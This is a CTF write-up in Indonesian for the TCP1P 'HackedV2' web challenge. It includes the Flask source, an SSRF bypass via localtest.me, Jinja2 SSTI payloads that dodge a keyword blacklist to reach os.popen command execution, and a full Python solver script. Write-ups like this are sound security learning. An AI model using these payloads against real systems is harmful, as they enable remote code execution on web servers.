# TCP1P CTF - WEB - HackedV2 Writeup

Pada Challenge kali ini diberikan sebuah aplikasi web, yang terdapat kerentanan SSRF dan di chain dengan SSTI untuk mendapatkan flag, untuk mengeksekusi SSRF caranya cukup mudah, namun untuk melakukan SSTI terdapat sangat banyak filter yang menghalangi sehingga cara untuk mendapatkan SSTI cukup tricky.

## Source Code
### App.py
```python
from flask import Flask, request, Response, jsonify, redirect, url_for, render_template_string, abort
from util import is_from_localhost, proxy_req, url_decode
from flask import request, abort
import random, os

app = Flask(__name__)

# I BLACKLIST EVERY CHAR :)

blacklist = ["debug", "args", "headers", "cookies", "environ", "values", "query",
    "data", "form", "os", "system", "popen", "subprocess", "globals", "locals",
    "self", "lipsum", "cycler", "joiner", "namespace", "init", "join", "decode",
    "module", "config", "builtins", "import", "application", "getitem", "read",
    "getitem", "mro", "endwith", " ", "'", '"', "_", "{{", "}}", "[", "]", "\\", "x"]

def check_forbidden_input(func):
    def wrapper(*args, **kwargs):
        for header, value in request.headers.items():
            decoded_value = url_decode(value)
            print(decoded_value)
            for forbidden_str in blacklist:
                if forbidden_str in decoded_value:
                    abort(400, f"Forbidden: '{forbidden_str}' not allowed in {header} header")

        for key, value in request.args.items():
            decoded_key = url_decode(key)
            decoded_value = url_decode(value)
            print(decoded_value)
            for forbidden_str in blacklist:
                if forbidden_str in decoded_key or forbidden_str in decoded_value:
                    abort(400, f"Forbidden: '{forbidden_str}' not allowed in URL parameter '{key}'")

        try:
            if request.is_json:
                json_data = request.get_json()
                if json_data:
                    for key, value in json_data.items():
                        decoded_key = url_decode(key)
                        decoded_value = url_decode(value)
                        print(decoded_value)
                        for forbidden_str in blacklist:
                            if forbidden_str in decoded_key or forbidden_str in decoded_value:
                                abort(400, f"Forbidden: '{forbidden_str}' not allowed in JSON request body key '{key}'")
            else:
                body = request.get_data(as_text=True)
                decoded_body = url_decode(body)
                print(decoded_body)
                for forbidden_str in blacklist:
                    if forbidden_str in decoded_body:
                        abort(400, f"Forbidden: '{forbidden_str}' not allowed in request body")
        except Exception as e:
            pass

        return func(*args, **kwargs)
    return wrapper

@app.route('/', methods=['GET'])
def proxy():
    url = request.args.get('url')

    list_endpoints = [
        '/about/',
        '/portfolio/',
    ]

    if not url:
        endpoint = random.choice(list_endpoints)
        # Construct the URL with query parameter
        return redirect(f'/?url={endpoint}')
    
    target_url = "http://daffa.info" + url

    if target_url.startswith("http://daffa.info") and any(target_url.endswith(endpoint) for endpoint in list_endpoints):
        response, headers = proxy_req(target_url)

        return Response(response.content, response.status_code, headers.items())
    else:
        abort(403)

@app.route('/secret', methods=['GET', 'POST'])
def dev_secret():
    admin = "daffainfo"
    css_url = url_for('static', filename='css/main.css')

    if request.args.get('admin') is not None:
        admin = request.args.get('admin')
        print(admin)

    if not admin:
        abort(403)

    template = '''<!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Admin Notes Preview</title>
            <link rel="stylesheet" href="{}">
        </head>
        <body>
            <h1>NOTES!! ONLY ADMIN CAN ACCESS THIS AREA!</h1>
            <form action="" method="GET">
                <label for="admin">Admin:</label>
                <input type="text" id="admin" name="admin" required>
                <br>
                <input type="submit" value="Preview!">
            </form>
            <p>Admin: {}<span id="adminName"></span></p>
        </body>
        </html>'''.format(css_url, admin)
    return render_template_string(template)

app.run(host='0.0.0.0', port=1337)
```
### util.py
```python
from flask import request, abort
from urllib.parse import urlparse, unquote
import functools, requests

RESTRICTED_URLS = ['localhost', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']

def is_safe_url(url):
    parsed_url = urlparse(url)
    hostname = parsed_url.hostname
    if not hostname:
        return False
    for restricted_url in RESTRICTED_URLS:
        if restricted_url in hostname:
            return False
    return True

def is_from_localhost(func):
    @functools.wraps(func)
    def check_ip(*args, **kwargs):
        if request.remote_addr != '127.0.0.1':
            return abort(403)
        return func(*args, **kwargs)
    return check_ip

def url_decode(value):
    decoded_value = unquote(value)
    print(f'value decoded in unquote func: {decoded_value}')
    while decoded_value != value:
        value = decoded_value
        print(f'value in loop: {value}')
        decoded_value = unquote(value)
        print(f'value decoded in loop: {decoded_value}')
    print(f'value decoded in url_decoded func: {decoded_value}')
    return decoded_value

def proxy_req(url):
    method = request.method
    headers = {
        key: value for key, value in request.headers if key.lower() in ['x-csrf-token', 'cookie', 'referer']
    }
    data = request.get_data()

    response = requests.request(
        method,
        url,
        headers=headers,
        data=data,
        verify=False,
        allow_redirects=False  # Prevent following redirects
    )

    if not is_safe_url(url) or not is_safe_url(response.url):
        return abort(403)
    
    return response, headers
```

## Gather Information

berdasarkan kode diatas, ketika kita memasukan parameter `/?url=/about/` maka web akan melakukan search dengan domain `http://daffa.info/about/`, ini bisa kita manfaatkan untuk melakukan SSRF, berikut payloadnya

### SSRF Payload
#### Parameter
```bash
/?url=.ABCDEFGHIJKLMNOPQRSTUVWXYZ.localtest.me:1337/secret?admin={ssti_payload}/about/
```
dengan memasukan payload diatas, kita bisa melakukan bypass yang mana hanya localhost yang bisa mengakses endpoint `secret`

Setelah masuk ke endpoint secret, disini kesenangan dimulai, kita harus mencari cara untuk melakukan SSTI dengan banyaknya blacklist yang ada. kita bisa memasukan SSTI pada parameter admin.

### SSTI Payload
#### blacklist
```python
blacklist = ["debug", "args", "headers", "cookies", "environ", "values", "query",
    "data", "form", "os", "system", "popen", "subprocess", "globals", "locals",
    "self", "lipsum", "cycler", "joiner", "namespace", "init", "join", "decode",
    "module", "config", "builtins", "import", "application", "getitem", "read",
    "getitem", "mro", "endwith", " ", "'", '"', "_", "{{", "}}", "[", "]", "\\", "x"]
```
#### RCE Payload
```python
{%with a=request|attr("appli"+"cation")|attr("\u005f\u005fglo"+"bals\u005f\u005f")|attr("\u005f\u005fget"+"item\u005f\u005f")("\u005f\u005fbuil"+"tins\u005f\u005f")|attr("\u005f\u005fgeti"+"tem\u005f\u005f")("\u005f\u005fimp"+"ort\u005f\u005f")("o"+"s")|attr("po"+"pen")("cat${IFS}/")|attr("re"+"ad")()%}{%print(a)%}{%endwith%}
```
Berbeda dengan HackedV1 kita bisa melakukan double url encode pada payload dan berhasil menembus bypass, pada hackedV2 terdapat fungsi `decoded_value = url_decode(value)` yang akan melakukan pengecekan apakah ada strings blacklist yang ter encode dan mendecodenya sebelum melakukan pengecekan.

ini masih kita bypass dengan memanfaatkan ssti dengan basis `for`

berikut merupakan payload lengkap dengan penjelasannya

### SSTI PHASE 1
```bash
{% for i in request.url|slice(1) %}
{% print(i) %}
{% endfor %}
```
Payload diatas akan melakukan looping di semua karakter yang ada di url berikut hasil dari perintah ssti diatas
```
Admin: ['h', 't', 't', 'p', ':', '/', '/', 'd', 'a', 'f', 'f', 'a', '.', 
'i', 'n', 'f', 'o', '.', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 
'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 
'z', '.', 'l', 'o', 'c', 'a', 'l', 't', 'e', 's', 't', '.', 'm', 'e', ':', 
'1', '3', '3', '7', '/', 's', 'e', 'c', 'r', 'e', 't', '?', 'a', 'd', 'm', 
'i', 'n', '=', '{', '%', '2', '5', '%', '2', '0', 'f', 'o', 'r', '%', '2', 
'0', 'i', '%', '2', '0', 'i', 'n', '%', '2', '0', 'r', 'e', 'q', 'u', 'e', 
's', 't', '.', 'u', 'r', 'l', '|', 's', 'l', 'i', 'c', 'e', '(', '1', ')', 
'%', '2', '0', '%', '2', '5', '}', '{', '%', '2', '5', '%', '2', '0', 'p', 
'r', 'i', 'n', 't', '(', 'i', ')', '%', '2', '0', '%', '2', '5', '}', '{', 
'%', '2', '5', '%', '2', '0', 'e', 'n', 'd', 'f', 'o', 'r', '%', '2', '0', 
'%', '2', '5', '}', '/', 'a', 'b', 'o', 'u', 't', '/']/about/
```
output dari for diatas bisa kita manfaatkan untuk crafting payload ssti seperti `application`, `globals`, `import`, dan lain sebagainya.

### SSTI PHASE 2
berikutnya kita harus mencari karakter `_`, dan `<space>` pada output program, berikut syntaxnya
```bash
{% set dd = i.21~i.18~i.37~i.18 %}
{% for k in request|attr(dd)|string|slice(1)%}
{% print(k) %}
{% endfor %}
```
payload diatas akan menghasilkan output seperti berikut
```
['b', "'", '_', ' ', '.', '-', '0', '1', '2', '3', '4', '5', '6', '7', '8', 
'9', "'"]
```

### SSTI PHASE 3
Selanjutnya kita tinggal melakukan craft payload ssti seperti biasa menggunakan outputan program.

#### payload before craft
```bash
request|attr("application")|attr("____globals____")|attr("____getitem____")
("____builtins____")|attr("____getitem____")("____import____")
("os")|attr("popen")("ls${IFS}/")|attr("read")()%}
```

#### payload after craft
```
{% for i in request.url|slice(1) %}{% set dd = i.21~i.18~i.37~i.18 %}{% for 
k in request|attr(dd)|string|slice(1) %}{% set a1 = 
i.8~i.3~i.3~i.29~i.13~i.20~i.8~i.1~i.13~i.16~i.14%}{% set a2 = 
k.2~k.2~i.24~i.29~i.16~i.19~i.8~i.29~i.36~k.2~k.2%}{% set a3 = 
k.2~k.2~i.24~i.22~i.1~i.13~i.1~i.22~i.30~k.2~k.2%}{% set a4 = 
k.2~k.2~i.19~i.38~i.13~i.29~i.1~i.13~i.14~i.36~k.2~k.2%}{% set a5 = 
k.2~k.2~i.13~i.30~i.3~i.16~i.35~i.1~k.2~k.2%}{% set a6 = i.16~i.36%}{% set 
a7 = i.3~i.16~i.3~i.22~i.14%}{% set a9 = i.35~i.22~i.8~i.7%}{% set a8 = 
i.29~i.36%}{%print(request|attr(a1)|attr(a2)|attr(a3)(a4)|attr(a3)(a5)
(a6)|attr(a7)(a8)|attr(a9)())%}{% endfor %}{% endfor %}
```

### Automation Solver Code
```python
import requests
from bs4 import BeautifulSoup
url = 'http://127.0.0.1:23678/'
# url = 'http://ctf.tcp1p.team:10012'
headers = {
    'Accept-Language': 'en-US',
    'Upgrade-Insecure-Requests': '1',
    'Connection': 'keep-alive',
    'Accept-Encoding': 'identity',
    'x-csrf-token': 'sad'
}


# Fungsi untuk mencari indeks huruf dalam list
def find_indices_of_letter(letter_list, target_letter):
    return [index for index, letter in enumerate(letter_list) if letter == target_letter]

# List huruf yang ingin diolah
i = ['h', 't', 't', 'p', ':', '/', '/', 'd', 'a', 'f', 'f', 'a', '.', 'i', 'n', 'f', 'o', '.', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '.', 'l', 'o', 'c', 'a', 'l', 't', 'e', 's', 't', '.', 'm', 'e', ':', '1', '3', '3', '7', '/', 's', 'e', 'c', 'r', 'e', 't', '?', 'a', 'd', 'm', 'i', 'n', '=', '{', '%', '2', '5', '%', '2', '0', 'f', 'o', 'r', '%', '2', '0', 'i', '%', '2', '0', 'i', 'n', '%', '2', '0', 'r', 'e', 'q', 'u', 'e', 's', 't', '.', 'u', 'r', 'l', '|', 's', 'l', 'i', 'c', 'e', '(', '1', ')', '%', '2', '0', '%', '2', '5', '}', '{', '{', '%', '2', '0', 'i', '%', '2', '0', '}', '}', '{', '%', '2', '5', '%', '2', '0', 'e', 'n', 'd', 'f', 'o', 'r', '%', '2', '0', '%', '2', '5', '}', '/', 'a', 'b', 'o', 'u', 't', '/']
k = ['b', "'", '_', ' ', '.', '-', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', "'"]

formating = []
inputan = 'ls'

for a in inputan:
    for x in a:
        indices_of_t = find_indices_of_letter(i, x)
        if indices_of_t:
            found = f'i.{indices_of_t[0]}'
        else:
            # Jika tidak ditemukan di 'i', coba cari di 'k'
            indices_of_k = find_indices_of_letter(k, x)
            if indices_of_k:
                found = f'k.{indices_of_k[0]}'
            else:
                continue

        formating.append(found)
        break

formatted_indices = '~'.join([idx for idx in formating])
print(formatted_indices)

payload_start_for_i = '{%\x0afor\x0ai\x0ain\x0arequest.url|slice(1)\x0a%}'
payload_dd = '{%\x0aset\x0add\x0a=\x0ai.21~i.18~i.37~i.18\x0a%}'
payload_start_for_k = '{%\x0afor\x0ak\x0ain\x0arequest|attr(dd)|string|slice(1)\x0a%}'
set_application = '{%\x0aset\x0aa1\x0a=\x0ai.8~i.3~i.3~i.29~i.13~i.20~i.8~i.1~i.13~i.16~i.14%}'
set_globals = '{%\x0aset\x0aa2\x0a=\x0ak.2~k.2~i.24~i.29~i.16~i.19~i.8~i.29~i.36~k.2~k.2%}'
set_getitem = '{%\x0aset\x0aa3\x0a=\x0ak.2~k.2~i.24~i.22~i.1~i.13~i.1~i.22~i.30~k.2~k.2%}'
set_builtins = '{%\x0aset\x0aa4\x0a=\x0ak.2~k.2~i.19~i.38~i.13~i.29~i.1~i.13~i.14~i.36~k.2~k.2%}'
set_import = '{%\x0aset\x0aa5\x0a=\x0ak.2~k.2~i.13~i.30~i.3~i.16~i.35~i.1~k.2~k.2%}'
set_os = '{%\x0aset\x0aa6\x0a=\x0ai.16~i.36%}'
set_popen = '{%\x0aset\x0aa7\x0a=\x0ai.3~i.16~i.3~i.22~i.14%}'
set_cmd = f'{{%\x0aset\x0aa8\x0a=\x0a{formatted_indices}%}}'
set_read = '{%\x0aset\x0aa9\x0a=\x0ai.35~i.22~i.8~i.7%}'
print_dump = "{%print(a8)%}"
print_k = "{%print(request|attr(a1)|attr(a2)|attr(a3)(a4)|attr(a3)(a5)(a6)|attr(a7)(a8)|attr(a9)())%}"
palyoal_end_for_k = '{%\x0aendfor\x0a%}'
palyoal_end_for_i = '{%\x0aendfor\x0a%}'

print(f'{payload_start_for_i}{payload_dd}{payload_start_for_k}{set_application}{set_globals}{set_getitem}{set_builtins}{set_import}{set_os}{set_popen}{set_read}{set_cmd}{print_k}{palyoal_end_for_k}{palyoal_end_for_k}')

payload = f'/?url=.ABCDEFGHIJKLMNOPQRSTUVWXYZ.localtest.me:1337/secret?admin={payload_start_for_i}{payload_dd}{payload_start_for_k}{set_application}{set_globals}{set_getitem}{set_builtins}{set_import}{set_os}{set_popen}{set_read}{set_cmd}{print_k}{palyoal_end_for_k}{palyoal_end_for_k}/about/'
data = '_ .-0123456789'
response = requests.get(url + payload, headers=headers, data=data)
print(response.text)
if response.status_code == 200:
    soup = BeautifulSoup(response.text, 'html.parser')

    title = soup.title.string if soup.title else 'No Title Found'
    print(f"Title: {title}")

    body_text = soup.body.get_text(separator='\n', strip=True) if soup.body else 'No Body Found'
    print("\nBody Text:\n")
    print(body_text)
else:
    print(f"Error: {response.status_code}")
```